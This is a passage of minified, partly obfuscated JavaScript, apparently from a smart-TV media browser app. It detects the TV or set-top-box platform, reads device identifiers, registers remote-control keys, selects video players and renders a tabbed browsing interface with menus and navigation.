console.log(kjtYpr.hardware);kjtYpr.mac=document.getElementById("pluginNetwork").GetMAC(1);kjtYpr.series=(kjtYpr.hardware.replace("BD-","").indexOf("D")!=-1||kjtYpr.hardware.indexOf("BD-E5")!=-1)?"D":kjtYpr.series;model="samsapi";kjtYpr.series=(kjtYpr.hardware.indexOf("C")!=-1)?"C":kjtYpr.series;kjtYpr.series=(kjtYpr.hardware.indexOf("E")!=-1)?"E":kjtYpr.series;try{kjtYpr.serial=webapis.tv.info.getDeviceID()}catch(e){kjtYpr.serial=kjtYpr.mac}
widgetAPI.sendReadyEvent();pluginAPI.unregistKey(tvKey.KEY_VOL_UP);pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);pluginAPI.unregistKey(tvKey.KEY_MUTE);var c=document.getElementById('pluginObjectNNavi');if(c){c.SetBannerState(PL_NNAVI_STATE_BANNER_VOL)}
window.onShow=kjtYpr.onShowEventTVKey}else if(platform=="tizen"){try{kjtYpr.mac=webapis.network.getMac();kjtYpr.mac=kjtYpr.mac.toString().replace(/:/g,"").toLowerCase();model="tizenapi"}catch(e){console.log(e);kjtYpr.mac=undefined}
try{kjtYpr.hardware=webapis.productinfo.getModel();kjtYpr.serial=webapis.productinfo.getDuid()}catch(e){kjtYpr.hardware="undefined"}
if(gV(kjtYpr,"mac")==""){try{model="tizenapi2";kjtYpr.mac=cpmac;kjtYpr.mac=kjtYpr.mac.toString().replace(/:/g,"").toLowerCase();kjtYpr.hardware=cphardware;kjtYpr.serial=cpserial}catch(e){console.log(e);kjtYpr.mac=undefined}}
if(gV(kjtYpr,"mac")==""){model="tizencut";kjtYpr.mac=undefined}
supportStorage=!0;try{tizen.tvinputdevice.registerKey("0");tizen.tvinputdevice.registerKey("1");tizen.tvinputdevice.registerKey("2");tizen.tvinputdevice.registerKey("3");tizen.tvinputdevice.registerKey("4");tizen.tvinputdevice.registerKey("5");tizen.tvinputdevice.registerKey("6");tizen.tvinputdevice.registerKey("7");tizen.tvinputdevice.registerKey("8");tizen.tvinputdevice.registerKey("9");tizen.tvinputdevice.registerKey("ColorF0Red");tizen.tvinputdevice.registerKey("ColorF1Green");tizen.tvinputdevice.registerKey("ColorF2Yellow");tizen.tvinputdevice.registerKey("ColorF3Blue");tizen.tvinputdevice.registerKey("MediaPlay");tizen.tvinputdevice.registerKey("MediaStop");tizen.tvinputdevice.registerKey("MediaPause");tizen.tvinputdevice.registerKey("MediaRewind");tizen.tvinputdevice.registerKey("MediaFastForward");tizen.tvinputdevice.registerKey("MediaRecord");tizen.tvinputdevice.registerKey("MediaPlayPause");tizen.tvinputdevice.registerKey("ChannelList");tizen.tvinputdevice.registerKey("ChannelUp");tizen.tvinputdevice.registerKey("ChannelDown");tizen.tvinputdevice.registerKey("PreviousChannel");tizen.tvinputdevice.registerKey("Info")}catch(e){console.log(e);if(box_client=="tForkPlayer2.57m")kjtYpr.popUp(e.message)}}else if(uaJ=="dune"){try{kjtYpr.mac=stb.getSerialNumber();kjtYpr.mac=kjtYpr.mac.toString().replace(/-/g,"");kjtYpr.mac=kjtYpr.mac.replace(/0000/g,"");kjtYpr.serial=kjtYpr.mac;if(kjtYpr.mac.length>12)kjtYpr.mac=kjtYpr.mac.substr(kjtYpr.mac.length-12);kjtYpr.hardware=stb.getProductId()+"-"+stb.getApiVersion();model="duneapi"}catch(e){console.log(e)}
if(typeof kjtYpr.hardware=="undefined")kjtYpr.hardware="DUNE";kjtYpr.lll0Il11OxICbl1ll0Ypr("test","1");if(kjtYpr.l1O0l1gmmv01O11Ypr("test")=="1")supportStorage=!0;else supportStorage=!1}else if(uaJ=="mag"){try{kjtYpr.mac=stb.GetDeviceMacAddress();kjtYpr.mac=kjtYpr.mac.toString().replace(/:/g,"");kjtYpr.serial=stb.GetDeviceSerialNumber();kjtYpr.hardware=stb.GetDeviceModel();model="magapi"}catch(e){console.log(e)}
if(typeof kjtYpr.hardware=="undefined")kjtYpr.hardware="MAG";kjtYpr.lll0Il11OxICbl1ll0Ypr("test","1");if(kjtYpr.l1O0l1gmmv01O11Ypr("test")=="1")supportStorage=!0;else supportStorage=!1}else if(uaJ=="spark"){try{kjtYpr.mac=__spark_stbid__;kjtYpr.hardware=__model__+"/"+__appVersion__;kjtYpr.mac=kjtYpr.mac.toLowerCase();model="sparkapi"}catch(e){console.log(e)}
if(typeof kjtYpr.hardware=="undefined")kjtYpr.hardware="SPARK";kjtYpr.lll0Il11OxICbl1ll0Ypr("test","1");if(kjtYpr.l1O0l1gmmv01O11Ypr("test")=="1")supportStorage=!0;else supportStorage=!1}else if(platform=="android-device"){try{var s=andr.cmd("initial");kjtYpr.signature=s;console.log(s);kjtYpr.hardware=s.split("|")[2];kjtYpr.build=s.split("|")[4];if(kjtYpr.build>4.6){model="androidapi";kjtYpr.mac=s.split("|")[7];if(kjtYpr.mac.length==15)kjtYpr.mac="z"+kjtYpr.mac;if(kjtYpr.mac.length!=16)kjtYpr.mac="";kjtYpr.serial=kjtYpr.mac;kjtYpr.mac=kjtYpr.mac.substr(0,12)}}catch(e){console.log(e)}}else{if(typeof window.webOS=="object")uaJ="lgw";try{if(kjtYpr.mac==undefined){kjtYpr.mac=$_("device").net_macAddress;kjtYpr.mac=kjtYpr.mac.toString().replace(/:/g,"");model="lgapi"}}catch(e){console.log(e)}
try{if(document.location.href.indexOf("sonynostorage")>0){supportStorage=!1}else{kjtYpr.lll0Il11OxICbl1ll0Ypr("test","1");if(kjtYpr.l1O0l1gmmv01O11Ypr("test")=="1")supportStorage=!0;else supportStorage=!1}
if(tFlp=="LG"){kjtYpr.hardware="pc"}else if(tFlp=="sony"){var t=navigator.userAgent.match(/Model\/([\S]+)/);kjtYpr.hardware=t[1]}else if(tFlp=="lg"){kjtYpr.hardware=$_("device").modelName;if(ua.match(/webappmanager/)&&(kjtYpr.hardware.indexOf("LF")>0||kjtYpr.hardware.indexOf("UF")>0))uaJ="lgw2"}else kjtYpr.hardware=tFlp;kjtYpr.series=(kjtYpr.hardware.indexOf("Media")!=-1||kjtYpr.hardware.indexOf("LS")!=-1||kjtYpr.hardware.indexOf("LW")!=-1||kjtYpr.hardware.indexOf("LV")!=-1||kjtYpr.hardware.indexOf("LM")!=-1||kjtYpr.hardware.indexOf("PA")!=-1||kjtYpr.hardware.indexOf("PM")!=-1)?"LW":kjtYpr.series;kjtYpr.series=(kjtYpr.hardware.indexOf("LB")!=-1)?"LB":kjtYpr.series;if(kjtYpr.hardware.indexOf("LX")>0)kjtYpr.series="LW"}catch(e){}
if(lg_model!="")kjtYpr.hardware=lg_model+"_webOS";try{if(kjtYpr.serial==undefined){kjtYpr.serial=$_("device").serialNumber;kjtYpr.serial=kjtYpr.serial.toString().replace(/:/g,"")}}catch(e){kjtYpr.serial="nonundefined"}}}
if(kjtYpr.defaulted)kjtYpr.setDefault(1);if(gV(kjtYpr.GL,"name")=="")kjtYpr.GL.name=capitalizeFirstLetter(uaJ)+"_"+kjtYpr.hardware;kjtYpr.GL.name=kjtYpr.GL.name.replace(" ","_");pqrs();if(tmac.indexOf(kjtYpr.mac)>0){kjtYpr.lll0Il11OxICbl1ll0Ypr("rek","");kjtYpr.lll0Il11OxICbl1ll0Ypr("xr","");rek_url="rek_on";ttmac=!0}
if(document.location.href.indexOf("operatv.obovse.ru")>0)model="operatv"+model;console.log("VIRT="+kjtYpr.virtual);if(gm=="sync")readSet();if(TS&&gm!="sync"){loadinfo("_FPZagruzka_ _FPdata from server_...");autoimport();return}
confirmed.close();handler="menu";kjtYpr.inf("");updateLoginData(kjtYpr.l1O0l1gmmv01O11Ypr("lastdata"));updateLogin();if(typeof kjtYpr.hardware!="undefined"){var t=kjtYpr.hardware.match(/\d+/);if(t!=null)kjtYpr.diag=t[0];else kjtYpr.diag=""}
if(kjtYpr.diag<22||kjtYpr.diag>90)kjtYpr.diag="";console.log("d="+kjtYpr.diag);console.log(kjtYpr.GL);if(platform=="android-device"&&kjtYpr.build>=5.2){sPlayer.media="MX Player"
exAll=exPl=["html5","jw","manual","media","vimu"];exPlV=["jw","html5","manual","media","vimu"]}else{exAll=["html5","jw","media","ifrhtml5","download"];if(platform=="tizen"){exPl=["html5","jw","tizen"];exPlV=["jw","html5","tizen"];exAll=["html5","jw","tizen","ifrhtml5","download"]}else if(platform=="sams"||uaJ.match(/dune|mag/)){exPl=["media"];exPlV=["media"]}else if(uaJ.match(/webtizen|iphone|sony/)||model.match(/webos|uc/)){exPl=["html5","jw","ifrhtml5"];exPlV=["jw","html5","ifrhtml5"]}else if(box_low2){exPl=["media","html5","ifrhtml5"];exPlV=["media","html5","ifrhtml5"]}else{exPl=["html5","jw","media","ifrhtml5"];exPlV=["jw","html5","media","ifrhtml5"]}}
if(jwplayer==null){exPl=arrDelValue(exPl,"jw");exPlV=arrDelValue(exPlV,"jw");exAll=arrDelValue(exAll,"jw")}
var kv=-1;$.each(exPl,function(i,v){if(v==kjtYpr.GL.player)kv=i});if(kv<0)kjtYpr.GL.player=exPl[0];kv=-1;$.each(exPlV,function(i,v){if(v==kjtYpr.GL.streamplayer)kv=i});if(kv<0)kjtYpr.GL.streamplayer=exPlV[0];initmain();if(kjtYpr.GL.font!="")document.getElementsByTagName('body')[0].style.fontFamily=f_font[kjtYpr.GL.font];if($_("video")!=null)$_("video").style.zIndex="0";if((kjtYpr.mac=="020000000000"||kjtYpr.mac=="112233445566"||kjtYpr.mac=="000000000000")){kjtYpr.mac=""}
if(kjtYpr.build<4.7&&(platform=="android-device"))kjtYpr.mac="";if(kjtYpr.build<5.1&&(platform=="android-device")){kjtYpr.inf("Доступна новая версия приложения!",1800)}
var s=kjtYpr.l1O0l1gmmv01O11YprC("hm");if(s=="")s=kjtYpr.l1O0l1gmmv01O11Ypr("hm");if(s.indexOf(kjtYpr.mac)==-1){s+=kjtYpr.mac+";";kjtYpr.lll0Il11OxICbl1ll0YprC("hm",s);kjtYpr.lll0Il11OxICbl1ll0Ypr("hm",s)}
kjtYpr.hm=s;loadxmltv()}catch(e){console.log(e);kjtYpr.popUp("Error load: "+e.message)}};var uWt;function updateWeather(){clearTimeout(uWt);uWt=setTimeout("updateWeather();",2000000);if(kjtYpr.GL.weather==-1){$_("weather").style.display="none";return}
uHelper.create("directnoheader").hid().getI("http://cloudflare.appinfo.su/browseraccount/?do=weather&box_low2="+box_low2+"&id="+kjtYpr.GL.weather).parse=function(s){console.log("weather="+s);$_("weather").style.display="block";lI1I1IxFCIh1l01llYpr("weather",s)}}
var np_timer,np_timer_start=0,chfon=0;function np_d(code){np_timer_start++;keyHandler({'keycode':code});var tm=500-np_timer_start*80;if(tm<50)tm=50;np_timer=setTimeout("np_d("+code+");",tm)}
function np_u(code){clearTimeout(np_timer)}
function onShowEvent(){var nnaviPlugin=document.getElementById('pluginObjectNNavi');nnaviPlugin.SetBannerState(1);pluginAPI.unregistKey(tvKey.KEY_VOL_UP);pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);pluginAPI.unregistKey(tvKey.KEY_MUTE)};kjtYpr.onShowEventTVKey=function(){pluginAPI.setOffScreenSaver();pluginAPI.setOffIdleEvent();pluginAPI.unregistKey(tvKey.KEY_VOL_UP);pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);pluginAPI.unregistKey(tvKey.KEY_MUTE);pluginAPI.registKey(tvKey.KEY_GUIDE);pluginAPI.registKey(tvKey.KEY_SOURCE);pluginAPI.unregistKey(203);pluginAPI.unregistKey(204);pluginAPI.registKey(613);pluginAPI.registKey(105);pluginAPI.registKey(106);pluginAPI.registKey(309);pluginAPI.registKey(612);pluginAPI.registKey(1118);pluginAPI.registKey(1219);pluginAPI.registKey(84);pluginAPI.registKey(655);pluginAPI.registKey(1089);pluginAPI.registKey(1057);pluginAPI.registKey(1083);pluginAPI.registKey(1078);pluginAPI.registKey(1080);pluginAPI.registKey(1086);pluginAPI.registKey(78);pluginAPI.registKey(1249)};curWidget.onWidgetEvent=function(){kjtYpr.onShowEventTVKey()};var ll0I11QuIXO1OIYpr=20;var insetActive=0;var lastInset=0;var insetSelect=0;var insetCount=0;var ibut=["weather","remotesrc","acesrc","widget_time"];function allI(){var a=[];for(var i=0;i<=oInset.length;i++){if($_("inset"+i)!=null)a.push("inset"+i)}
$.each(ibut,function(i,val){if($_(val)!=null)if($_(val).style.display!="none")a.push(val)});return a}
function listInset(){if(insetSelect<0)insetSelect=allI().length-1;else if(insetSelect>=allI().length)insetSelect=0;$_("iactive").style.background='';$.each(allI(),function(i,val){if($_(val)!=null){if(i==insetActive){var iB="rgb(63, 77, 81)";var iC="#eeeeee"}else{iB="none";iC="#eeeeee"}
if(getSelect()==-1&&insetSelect==i){if(i!=insetActive)iB="#697e84";iC="#ccc";if(insetSelect==insetActive)$_("iactive").style.background='rgb(108, 124, 128)';$_(val).style.border="2px solid rgb(85, 144, 231)"}else $_(val).style.border="2px solid transparent";$_(val).style.background=iB;$_(val).style.color=iC;if($_("insetbrd"+i)!=null){if(i==insetActive||i==insetActive-1||((i==insetSelect||i==insetSelect-1)&&getSelect()==-1))$_("insetbrd"+i).style.borderRight="1px solid transparent";else $_("insetbrd"+i).style.borderRight="1px solid #1f1f1f"}
$_(val).onmouseover=function(){if(handler=='menu'){setSelect(-1);insetSelect=i;linkOver()}};$_(val).onmousedown=function(){setSelect(-1);insetSelect=i;p_d()};$_(val).onmouseup=function(){setSelect(-1);insetSelect=i;p_u()};$_(val).onclick=function(){if(!kjtYpr.long_left){insetSelect=i;playInset(val)}kjtYpr.long_left=!1}}})}
var icodef="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAB9klEQVRIS7XUPUhVcRzGcd+7VxKVm5UVhW5BYINgEEpDbY7SptEggotbDg1NDQZCQjpFBDY4+EJGWE1aCAaBLqJS0CJEbiaCZXX7Pvfv0fPYcTs+8OHe3znc3zn/t1uUz+ePTeLFtCReTIsXR6ca53EJ51CFxFg/KzzFuIg+TGIRa/iEF+hGHSzWzwrPNbzHT3zBON5gBv1731+jCfuxflaE6I3V+Cv+YgefMY0W1KMCd7EJjaQRhVg/K0I0FbP4DjV8gFtoQAmidOIjfkHTdgrez4oQzbGmI3rTM0iKRncPmqYt3IH3syLsijF0oRXtUJNSxKN5fod1zOMbRpC1flaE7fYBV3AWGu4COlCOKPfxB/qRPn/jJWqtnxVhH2uBLqAZP6AbWtw2KFrwXmixdU/0XSPJWT8rwgGZw1XoQXpr/VCWEe1rTdMNDEAvoPtTqLF+VoSTN4oenMAjaMgyiDLEcxMb0P0hZKyfFSE6eW+hOVdz7XM1rkQ80fRsQ7vlNryfFSEa+is8gXaAHnAah6MFfo5dPMNJeD8rDqKtpoO0Cs1tUi5jCVpI7bJCrJ8VHh3pCejP6iGuQ6dUD3uMFTzFfmPF+lnxf3SkdfKGod2g06g/MDXXHBemIh7rZ8XRyaIWOdQgg8RYv3iRtsSLaUm8mI580T9yJyqr4N64nwAAAABJRU5ErkJggg==";var insCache="";function insetUpdate(){console.log("insetUpdate "+insCache);try{var i=insetActive;if(oInset[i].icon=="err")var ico=icoerr;else if(oInset[i].icon=="none"){dsp="none";ico=icodef}else if(oInset[i].getIcon()==""||oInset[i].icon=="def")ico=icodef;else ico=_img(oInset[i].getIcon());lI1I1IxFCIh1l01llYpr("insetttl"+i,oInset[i].getTitle());$_("imginset"+i).src=ico;$_("imginset"+i).style.display="block"}catch(e){console.log(e)}
listInset()}
function renderInset(){console.log("renderInset "+insetActive+"|"+insetCount+"|"+$_("inset").offsetWidth);if(insCache==insetActive+"|"+insetCount+"|"+$_("inset").offsetWidth)return insetUpdate();var html="";var rl=$_("inset").offsetWidth-38-(8*insetCount)-5-5;var rlp=100*rl/$_("inset").offsetWidth;insetW=(rlp/(oInset.length)).toFixed(2)-0.01;if(insetCount<3){insetW=46}
for(var i in oInset){var dsp="block";if(oInset[i].icon=="err")ico=icoerr;else if(oInset[i].icon=="none"){dsp="none";ico=icodef}else if(oInset[i].getIcon()==""||oInset[i].icon=="def")ico=icodef;else ico=_img(oInset[i].getIcon());html+="<div id='inset"+i+"' title='"+oInset[i].getTitle()+"' style='height: 30px;width:"+insetW+"%;float:left;border-radius: 10px 10px 0px 0px;overflow: hidden;'>"+"<img id='imginset"+i+"' height='"+css_wh(23)+"' style='max-width:"+css_w(23)+"px; width:45%; float:left;display:"+dsp+";padding-top:"+css_wh(6)+"px;padding-left:"+css_w(4)+"px;' onerror=\"onImgError(this);\" src='"+ico+"' />"+(i==insetActive?"<img id='iactive' onmouseout=\"this.style.background='';\" onmousemove=\"if(handler=='menu') this.style.background='rgb(108, 124, 128)';\" width='"+css_w(10)+"' height='"+css_wh(10)+"' style='border-radius:5px;float:right;padding:1px 3px;margin-top:"+css_wh(12)+"px;' src='"+icoclose+"'/>":"")+"<div id='insetttl"+i+"' style='height: 80%;overflow: hidden;background-color:transparent;margin:3px 0px 0px 5px;'>"+oInset[i].getTitle()+"</div>"+"</div><span  id='insetbrd"+i+"' style='width: 3px;margin: 5px 0px;border-right: 1px solid rgb(31, 31, 31);float: left;'>&nbsp;</span>"}
i++;html+="<div id='inset"+i+"' title='New inset' style='height: 30px;margin-left: 3px;  border-radius: 50%;float:left;'>"+"<img id='imginset"+i+"' width='30' height='24' style='padding:3px 2px 3px 3px;' alt='+' src='"+_img("_ST_page_plus.png")+"' />"+"<div id='insetttl"+i+"' style='overflow: hidden;background-color:transparent;'></div>"+"</div>";lI1I1IxFCIh1l01llYpr("inset",html);listInset();insCache=insetActive+"|"+insetCount+"|"+$_("inset").offsetWidth}
var oldinset=null;var insetSets={};function newInset(m){if(insetCount==ll0I11QuIXO1OIYpr){kjtYpr.popUp("Уже открыто максимальное количество вкладок!",2000);return}
breakScreen("about:blank");oInset.push(OeInit(Inset));insetCount=oInset.length;insetActive=insetCount-1;if(m)Ill1110().is_private=1;renderInset();listInset();gotoStart()}
function playInset(v){console.log("PlayInset "+insetSelect);if($_("ext").style.display=="block")$_("ext").style.display="none";if($_("vk").style.display!="none"){$_("vk").style.display="none";handler="menu"}
chGroupSel=0;if(insetSelect!=insetActive){oInset[insetActive].stopLoad()}
if(insetSelect==oInset.length){newInset(0)}else if(insetSelect>oInset.length){if(v==null)v=allI()[insetSelect];if(v=="weather")ol1IO0ORc1_tI0QlYpr("http://cloudflare.appinfo.su/browseraccount/?do=weather&id=set");else if(v=="remotesrc"||v=="acesrc")l0OI10IRge011lO1Ypr();else if(v=="widget_time"){m=[];for(var i=-11;i<=11;i++){var t=new Date(T.inetTime+i*3600000);var dstring=to(t.getHours(),t.getMinutes());m.push({"title":dstring,"playlist_url":"about:settings#set:JTVRegion:"+i+":return"})}
kjtYpr.l1Q1OIO0duul1l1IlYpr("onlymenu",m)}
return}else if(insetSelect!=insetActive){insetActive=insetSelect;renderInset();oInset[insetActive].navigateHist(-1);listInset()}else if(insetSelect==insetActive){if(oInset[insetActive].get("b")=="1")kjtYpr.popUp("_FPEtaVklBzabl_!<br>_FPDlRvIn_ _FPMenu_ / _FPRazblVkl_",1500);else{console.log("Close "+insetSelect);confirmed.create("_FPClose tab_? "+oInset[insetSelect].title).fun0=function(){console.log("close "+insetSelect);oldinset=oInset.splice(insetSelect,1);for(var i=0;i<ll0I11QuIXO1OIYpr;i++){if(oInset[i]!=null){oInset[i].id=i;oInset[i].save()}else kjtYpr.lll0Il11OxICbl1ll0Ypr("url"+i,"")}
if(oInset.length==0){newInset(0)}
insetCount=oInset.length;if(insetActive>insetCount-1)insetActive=insetCount-1;insetSelect=insetActive;kjtYpr.lll0Il11OxICbl1ll0Ypr("urlInset",insetActive);renderInset();listInset();oInset[insetActive].navigateHist(-1)}}}
kjtYpr.lll0Il11OxICbl1ll0Ypr("urlInset",insetActive)};var l1IIOlZ0rl001IOOYpr=null,toploading=0,shn=0;function setNAvUrl(){}
kjtYpr.lI110Iqx1z0Ol0QlYpr=function(nk){var link=lI100QcCODOlllYpr();if(ll0l0loMtIlIOYpr())link="about:blank";var html="",navtitle="",dopimg="";if(curPage.global.setcache!=""){dopimg+="<img align='left' title='Страница взята с кеша от "+dt(curPage.global.setcache,!0,!1,!0)+"' style='padding-top: "+css_wh(4)+"px;' width='"+css_w(20)+"' src='"+_img("_ST_fcache.png")+"' />"}else if(typeof curPage.global.cacheinfo!="undefined"&&curPage.global.cacheinfo!=null){if(curPage.global.cacheinfo.indexOf("FROMCACHE")>0){dopimg+="<img align='left' title='Кеш парсера от "+dt(curPage.global.cachetime,!0,!1,!0)+"' style='padding-top: "+css_wh(4)+"px;' width='"+css_w(20)+"' src='"+_img("_ST_cache.png")+"' />"}}
for(var i=0;i<curPage.channels.length;i++){if(gV(curPage.channels[i],"stream_url").indexOf("http://mylist.obovse.ru/hls/")==0||gV(curPage.channels[i],"stream_url").indexOf("/hls/userencrypt/")>0){dopimg+="<img align='left' title='Ссылки на видеофайлы на этой странице зашифрованы и не могут быть сохранены или скопированы!' style='padding-top: "+css_wh(4)+"px;' width='"+css_w(20)+"' src='"+_img("_ST_ssl.png")+"' />";break}}
if(curPage.IFRAMES.length){var xc=0,xa=0;for(var i in curPage.IFRAMES){xa++;if(curPage.IFRAMES[i].src){xc++}}
dopimg="Iframe:";kjtYpr.typeSource=xc+"/"+xa}
if(Ill1110("is_private"))kjtYpr.typeSource+=" Инкогнито";html+="<span id='navinfo2' style='float:left;color:gray;'>"+dopimg+"<svg xmlns='http://www.w3.org/2000/svg' style='float: left;padding: "+css_w(4)+"px;' height='"+css_wh(20)+"' width='"+css_w(20)+"' viewBox='0 0 48 48'><path d='M0 0h48v48h-48z' fill='none'></path><path d='M22 34h4v-12h-4v12zm2-30c-11.05 0-20 8.95-20 20s8.95 20 20 20 20-8.95 20-20-8.95-20-20-20zm0 36c-8.82 0-16-7.18-16-16s7.18-16 16-16 16 7.18 16 16-7.18 16-16 16zm-2-22h4v-4h-4v4z' fill='#808080' class='color000 svgShape'></svg>	 "+kjtYpr.typeSource+" | </span><span id='navurl' style='padding-left: 5px;float:left;overflow:hidden;max-width:"+css_w(800)+"px;'>"+getNavU(link)+"</span>";for(var i=oInset[insetActive].history.length-1;i>-1;i--){var ins=oInset[insetActive].history[i];if(navtitle!="")navtitle+=" / ";if(ll0l0loMtIlIOYpr(ins.url)){navtitle+=fp("_FPStartovoeMenu_")}else if(gV(ins,"title")!=""){navtitle+=ins.title.replace(/<.*?>/g,"")}
if(gV(curPage.global,"navigate")!="")navtitle="<span style='color:white;'>"+curPage.global.navigate+"</span>";lI1I1IxFCIh1l01llYpr("navigate",html+"<span id='navtitle' style='padding-left:5px;width: "+css_w(200)+"px;float:left;color:gray;'> - "+navtitle+"</span>");if($_("navigate").offsetWidth>css_w(1280)||ll0l0loMtIlIOYpr(ins.url))break}
sidebar_show()};function page_rs(t){if(t==null)t=$_("page_load");if(t.src.indexOf("stop")>0){oInset[insetActive].stop()}else if(t.src.indexOf("reload")>0){oInset[insetActive].reload()}}
function is_loadpage(m){if($_("page_load")==null)return;if(m!=null){if(m==-1){return is_loadpage(0)}
if(m){console.trace();$_("page_load").src=_img('_ST_page_stop.png')}else $_('page_load').src=_img('_ST_page_reload.png')}else if($_("page_load")!=null)if($_("page_load").src.indexOf("stop")>0)return 1;else return 0}
function stopLoadPage(){console.log("stopLoadPage");oInset[insetActive].stopLoad()}
var sdbar=null,sdbarSel=0;function sidebar_play(){oInset[insetActive].navigate(sdbar[sdbarSel])}
function sidebar_show(n){if(n!=null)sdbarSel=n;oInset[insetActive].focused()}
function menu_play(){if(typeof gP().menu[menuSel]=="undefined")return;if(menuSubSel>=0)oInset[insetActive].navigate(gP().menusub[menuSubSel]);else if(gP().menu[menuSel].playlist_url=="submenu"){$_("menu"+menuSel+"sub").style.display="block";gP().menusub=gP().menu[menuSel].submenu;menuSubSel=-1}else oInset[insetActive].navigate(gP().menu[menuSel])}
function menu_hideSub(n){if(gP().menu.length<1)return;if(n==null){for(var i=0;i<gP().menu.length;i++)if($_("menu"+i+"sub")!=null)$_("menu"+i+"sub").style.display="none"}else if($_("menu"+n+"sub")!=null)$_("menu"+n+"sub").style.display="none";menuSubSel=-2}
function menu_sel(){try{if(gP()!=null){if(gP().menu.length<1||$_("menu0")==null)return
if(menuSubSel>-2){if(menuSubSel>gP().menusub.length-1){menuSubSel=-2;oInset[insetActive].focused(0);return}else{for(var i=0;i<gP().menusub.length;i++){if(i==menuSubSel&&getSelect()==-3){$_("menu"+menuSel+"sub"+i).style.border="2px solid red"}else{$_("menu"+menuSel+"sub"+i).style.border="2px solid transparent"}}}}
if(menuSel>gP().menu.length-1)menuSel=0;else if(menuSel<0)menuSel=gP().menu.length-1;for(var i=0;i<gP().menu.length;i++){if(i==menuSel&&getSelect()==-3&&menuSubSel<0){$_("menu"+i).style.border="2px solid red"}else{$_("menu"+i).style.border="2px solid transparent"}}}}catch(e){console.log(e)}}
function sidebar_sel(){if(kjtYpr.GL.sidebar!="1")return
if(sdbarSel>sdbar.length-1)sdbarSel=0;else if(sdbarSel<0)sdbarSel=sdbar.length-1;for(var i=0;i<sdbar.length;i++){if($_("sdbar"+i)!=null){if(i==sdbarSel&&getSelect()==-2)$_("sdbar"+i).style.border="2px solid rgb(85, 144, 231)";else $_("sdbar"+i).style.border="2px solid transparent"}}}
var hideRight=!1;var omni_hor=2;var omniBut=[];omniBut.push({"id":"kb1","onclick":"gotoStart();","img":"_ST_page_home.png","quick":"blue"});omniBut.push({"id":"kb2","onclick":"tmf();","img":"_ST_page_back.png"});omniBut.push({"id":"kb3","onclick":"oInset[insetActive].forward();","img":"_ST_page_fwd.png"});omniBut.push({"id":"kb4","onclick":"page_rs();","img":"_ST_page_reload.png"});omniBut.push({"id":"top2text","onclick":"editUrl();","img":"_ST_page_home.png"});omniBut.push({"id":"kb5","onclick":"kjtYpr.l1Q1OIO0duul1l1IlYpr('favmenu');","img":"_ST_page_fav_off_white.png","quick":"green"});omniBut.push({"id":"kb6","onclick":"kjtYpr.l1Q1OIO0duul1l1IlYpr('topmenu');","img":"_ST_page_menu_white.png","quick":"yellow"});function omniSel(n){if(n!=null){if(n=="+")omni_hor++;else if(n=="-")omni_hor--;else omni_hor=n}
if(omni_hor>=omniBut.length)omni_hor=0;else if(omni_hor<0)omni_hor=omniBut.length-1;for(var i=0;i<omniBut.length;i++){if(getSelect()==-4&&omni_hor==i)$_(omniBut[i].id).style.border="2px solid #5590e7";else $_(omniBut[i].id).style.border="2px solid transparent"}}
function editUrl(){if(handler=="menu"){var v=gP().lIQ0Il1IlIb1Il1OYpr;if(v.indexOf("searchEngines")==0)v=v.split("|")[1];if(v=="about:blank")v="";setSelect(-4);var el={"title":"_FPEnter search query or URL_","playlist_url":"searchEngines","type":"omnibox","presearch":"http://omnibox.spiderxml.com/?type=all","value":v,"search_on":"_FPEnter search query or URL_"};VK.Show(0,el,'editurl',"",v);lI0I0QIO10llQlQI1Ypr("")}}
var lastResel="";function reselAll(n){if(n!=null)setSelect(n);var hsh=getSelect()+" "+menuSel+" "+menuSubSel+" "+sdbarSel;if(lastResel!=hsh){listInset();menu_sel();sidebar_sel();omniSel()}
lastResel=hsh}
function osetPos(x,y){console.log("is_ifr "+is_ifr()+"sel="+getSelect());if(lastsel==-4&&select!=-4)reselAll();if(x==0){margin=0;if(y==-1){if(getSelect()==-4)setSelect(-1);else if(getSelect()==-3){if(menuSubSel<0){if(kjtYpr.GL.sidebar=="1")setSelect(-2);else setSelect(-4)}else{return menu_sel(--menuSubSel)}}else if(getSelect()==-2)setSelect(-4);else{var row=-1;if(getSelect()>=0){if(gP()==null){console.log("set row 0");row=0}else if(typeof gP().sPos[getSelect()]=="undefined")row=0;else row=gP().sPos[getSelect()][1];if(row==0){if(gP()!=null&&gP().menu.length)setSelect(-3);else if(kjtYpr.GL.sidebar=="1")setSelect(-2);else setSelect(-4)}}
if(gP()!=null&&row!=0)oInset[insetActive].posStart(0,-1)}
if(plmini_on){clearTimeout(plmini_timer);videoLoad("off");plmini_timer=setTimeout("play_mini();",1300)}}
if(y==1){if(getSelect()==-1)setSelect(-4);else if(getSelect()==-4){if(kjtYpr.GL.sidebar=="1")setSelect(-2);else if(typeof gP()=="undefined")setSelect(-1);else if(gP().menu.length)setSelect(-3);else oInset[insetActive].focused(0)}else if(getSelect()==-3){if(menuSubSel==-2)oInset[insetActive].focused(0);else{return menu_sel(++menuSubSel)}}else if(getSelect()==-2&&gP().menu.length)setSelect(-3);else if(getSelect()==-2)oInset[insetActive].focused(0);else{oInset[insetActive].posStart(0,1)}
if(plmini_on){clearTimeout(plmini_timer);videoLoad("off");plmini_timer=setTimeout("play_mini();",1300)}}
linkOver()}
if(y==0){if(x==1){if(getSelect()==-4){return omniSel("+")}else if(getSelect()==-3){menu_hideSub();return menu_sel(++menuSel)}else if(getSelect()==-2)return sidebar_show(++sdbarSel);else if(getSelect()==-1){listInset(++insetSelect);oInset[insetActive].hint();return}
if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("tosettings")==0||gP("lIQ0Il1IlIb1Il1OYpr")=="cmdSetSearch"||gP("lIQ0Il1IlIb1Il1OYpr")=="cmdSetStart"){kjtYpr.lOIOl01Iys0yo1IlOI0Ypr(curCh()["playlist_url"],key)}else{oInset[insetActive].posStart(1,0)}}
if(x==-1){if(getSelect()==-4){return omniSel("-")}else if(getSelect()==-3){menu_hideSub();return menu_sel(--menuSel)}else if(getSelect()==-2)return sidebar_show(--sdbarSel);else if(getSelect()==-1){listInset(--insetSelect);oInset[insetActive].hint();return}
